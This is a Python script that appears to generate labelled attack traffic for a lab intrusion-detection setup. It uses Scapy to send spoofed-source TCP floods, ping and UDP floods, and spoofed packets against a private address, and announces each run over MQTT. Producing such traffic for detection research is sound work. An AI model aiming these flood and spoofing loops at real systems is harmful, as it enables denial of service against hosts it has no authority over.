import random
from time import sleep
import paho.mqtt.client as mqtt

from scapy.all import IP, TCP, send, ICMP, UDP
import uuid


def on_connect(client, userdata, flags, rc, properties=None):
    if rc == 0:
        print("Connected with result code " + str(rc))
    else:
        print("Failed to connect, return code " + str(rc))


def on_disconnect(client, userdata, flags, rc):
    print("Disconnected from MQTT broker.")


client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.on_connect = on_connect
client.connect("192.168.1.18", 1883, 60)
client.on_disconnect = on_disconnect

client.loop_start()  # Démarrer une boucle séparée pour la gestion de la connexion


def send_attack_notification(attack_type, attack_id, is_start=True):
    message = f"{attack_type}:{attack_id}{':start' if is_start else ':end'}"
    result = client.publish("attack/type", message)
    if result.rc != mqtt.MQTT_ERR_SUCCESS:
        print(f"Failed to send notification for {message}")


def simulate_attack(target_ip):
    attack_type = random.choice(['ddos'])
    attack_id = str(uuid.uuid4())  # Générer un ID unique pour cette attaque
    print(f"Simulating {attack_type.upper()} attack with ID {attack_id}")

    send_attack_notification(attack_type, attack_id, is_start=True)

    if attack_type == 'ddos':
        nombre_paquets = random.randint(3000, 5000)
        print(nombre_paquets)
        for _ in range(nombre_paquets):
            spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=random.randint(1, 65535))
            send(packet, verbose=0)

    elif attack_type == 'ping_flood':
        nombre_paquets = random.randint(400, 3000)
        print("Simulating Ping Flood")
        for _ in range(nombre_paquets):  # Augmente le nombre de pings pour simuler un flood
            packet = IP(dst=target_ip) / ICMP()
            send(packet, verbose=0)

    elif attack_type == "mitm":
        random_number = random.randint(1, 253)
        victim_ip = f"192.168.1.18"
        nombre_paquets = random.randint(1000, 5000)
        for _ in range(nombre_paquets):
            spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            # Falsification des adresses IP pour imiter l'IP de la victime
            if random.random() > 0.5:
                packet = IP(src=victim_ip, dst=target_ip) / TCP(seq=random.randint(1000, 10000),
                                                                ack=random.randint(1000, 10000))
            else:
                packet = IP(src=target_ip, dst=victim_ip) / TCP(seq=random.randint(1000, 10000),
                                                                ack=random.randint(1000, 10000))
            send(packet, verbose=0)

    elif attack_type == 'udp_flood':
        print("Simulating UDP flood attack")
        number_of_packets = random.randint(500, 5000)  # Définir le nombre de paquets à envoyer
        for _ in range(number_of_packets):
            packet = IP(dst=target_ip) / UDP(dport=random.randint(1, 65535))
            send(packet, verbose=0)

    send_attack_notification(attack_type, attack_id, is_start=False)


if __name__ == "__main__":
    target_ip = "192.168.1.18"
    try:
        while True:
            simulate_attack(target_ip)
            sleep_time = random.randint(100, 400)
            print(f" {sleep_time} secondes avant la prochaine attaque")
            sleep(sleep_time)
    except KeyboardInterrupt:
        print("Arret")
        client.loop_stop()
